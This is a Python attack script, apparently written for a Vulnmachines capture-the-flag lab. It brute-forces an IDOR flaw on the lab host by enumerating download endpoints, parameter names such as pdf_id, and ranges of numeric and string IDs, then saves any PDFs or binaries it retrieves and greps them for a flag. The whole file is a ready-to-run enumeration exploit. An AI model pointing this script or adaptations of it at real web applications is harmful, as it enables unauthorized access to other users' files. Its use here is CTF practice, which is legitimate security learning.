#!/usr/bin/env python3
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

target = "http://hackme1.vulnmachines.com"

# Common download endpoints based on the writeup hint
endpoints = [
    "download.php",
    "download",
    "downloads.php",
    "file.php",
    "files.php",
    "get.php",
    "fetch.php",
    "pdf.php",
    "pdfs.php",
    "document.php",
    "documents.php",
    "view.php",
    "export.php",
    "load.php",
    "read.php",
    
    # With directories
    "idor/download.php",
    "IDOR/download.php",
    "files/download.php",
    "documents/download.php",
    "pdfs/download.php",
    "pdf/download.php",
    "downloads/download.php",
    "uploads/download.php",
    "media/download.php",
    "challenge/download.php",
    "lab/download.php",
    "vulnmachines/download.php",
    "vnm/download.php",
    
    # API variations
    "api/download.php",
    "api/download",
    "api/v1/download",
    "api/v2/download",
    "api/pdf",
    "api/file",
    
    # Index variations
    "index.php",
    "main.php",
    "app.php"
]

# Try different parameter names (pdf_id is the main one from writeup)
parameters = [
    "pdf_id",
    "pdfid",
    "pdf-id",
    "PDF_ID",
    "id",
    "ID",
    "file_id",
    "fileid",
    "file",
    "document_id",
    "doc_id",
    "download_id",
    "item_id"
]

# Values to try (expand the range for IDOR)
values = list(range(0, 101))  # Try IDs from 0 to 100
values.extend([123, 200, 404, 500, 999, 1000, 1337, 9999])
# Also try string values
string_values = ["admin", "flag", "secret", "test", "demo", "idor", "vnm", "pdf"]

def test_pdf_id(endpoint, param, value):
    try:
        url = f"{target}/{endpoint}"
        
        # Try GET request
        get_url = f"{url}?{param}={value}"
        response = requests.get(get_url, timeout=5, allow_redirects=False)
        
        if response.status_code == 200:
            content = response.content
            content_type = response.headers.get('Content-Type', '').lower()
            
            # Check if it's a PDF
            if content[:4] == b'%PDF' or 'application/pdf' in content_type:
                print(f"[!!!] PDF FOUND: {get_url}")
                return get_url, content
            
            # Check if it's any binary file
            elif len(content) > 100 and not content.startswith(b'<!'):
                if b'flag' in content.lower() or b'vnm{' in content.lower():
                    print(f"[!!!] FLAG FOUND: {get_url}")
                    return get_url, content
                elif len(content) > 1000:
                    print(f"[!] Binary file: {get_url} - Size: {len(content)}")
                    return get_url, content
            
            # Check for interesting text content
            elif b'vnm{' in content.lower() or b'flag' in content.lower():
                print(f"[!] Interesting content: {get_url}")
                return get_url, None
                
        elif response.status_code in [301, 302]:
            location = response.headers.get('Location', '')
            if 'pdf' in location.lower() or 'download' in location.lower():
                print(f"[>] Redirect: {get_url} -> {location}")
                
    except Exception:
        pass
    
    return None, None

print("[*] IDOR PDF_ID Exploitation")
print(f"[*] Target: {target}")
print("[*] Based on writeup: Looking for pdf_id parameter vulnerability")
print("-" * 70)

# First, find which endpoints exist
print("\n[*] Phase 1: Finding active download endpoints...")
active_endpoints = []

for endpoint in endpoints:
    try:
        url = f"{target}/{endpoint}"
        response = requests.get(url, timeout=2)
        if response.status_code in [200, 301, 302, 400, 401, 403, 500]:
            print(f"[Active] {endpoint} - Status: {response.status_code}")
            active_endpoints.append(endpoint)
    except:
        pass

if not active_endpoints:
    print("[-] No standard endpoints found, trying all with pdf_id parameter...")
    active_endpoints = endpoints[:15]  # Try top endpoints anyway

print(f"\n[*] Phase 2: Testing pdf_id parameter on endpoints...")
found_pdfs = []

# Focus on pdf_id parameter first (from writeup)
for endpoint in active_endpoints + endpoints[:10]:
    for value in values[:50]:  # Test first 50 values
        url, content = test_pdf_id(endpoint, "pdf_id", value)
        if content:
            found_pdfs.append((url, content))
            
# If no PDFs found with pdf_id, try other parameters
if not found_pdfs:
    print("\n[*] No PDFs with pdf_id, trying other parameter names...")
    for endpoint in active_endpoints[:5]:
        for param in parameters[1:5]:  # Try other params
            for value in values[:20]:
                url, content = test_pdf_id(endpoint, param, value)
                if content:
                    found_pdfs.append((url, content))

# Also try string values
print("\n[*] Testing string values...")
for endpoint in active_endpoints[:5] + endpoints[:5]:
    for value in string_values:
        url, content = test_pdf_id(endpoint, "pdf_id", value)
        if content:
            found_pdfs.append((url, content))

print("\n" + "=" * 70)

if found_pdfs:
    print(f"\n[!!!] SUCCESS: Found {len(found_pdfs)} file(s) via IDOR!")
    
    for i, (url, content) in enumerate(found_pdfs[:10], 1):  # Limit to first 10
        filename = f"/workspace/idor_pdf_{i}"
        
        # Determine file type
        if content[:4] == b'%PDF':
            filename += ".pdf"
            filetype = "PDF"
        elif content[:2] == b'PK':
            filename += ".zip"
            filetype = "ZIP"
        elif b'<html' in content[:100]:
            filename += ".html"
            filetype = "HTML"
        else:
            filename += ".bin"
            filetype = "Binary"
        
        with open(filename, 'wb') as f:
            f.write(content)
        
        print(f"\n[+] File {i}:")
        print(f"    URL: {url}")
        print(f"    Type: {filetype}")
        print(f"    Size: {len(content)} bytes")
        print(f"    Saved to: {filename}")
        
        # Check for flag
        if b'vnm{' in content.lower():
            flag_start = content.lower().index(b'vnm{')
            flag_preview = content[flag_start:flag_start+50]
            print(f"    [!!!] FLAG FOUND: {flag_preview.decode('utf-8', errors='ignore')}")
            
else:
    print("\n[-] No PDFs found via standard IDOR")
    print("[*] Possible issues:")
    print("    - The endpoint might be on port 7500 (currently down)")
    print("    - Different parameter name or encoding")
    print("    - Requires authentication or session")
    print("    - Virtual host or subdomain specific")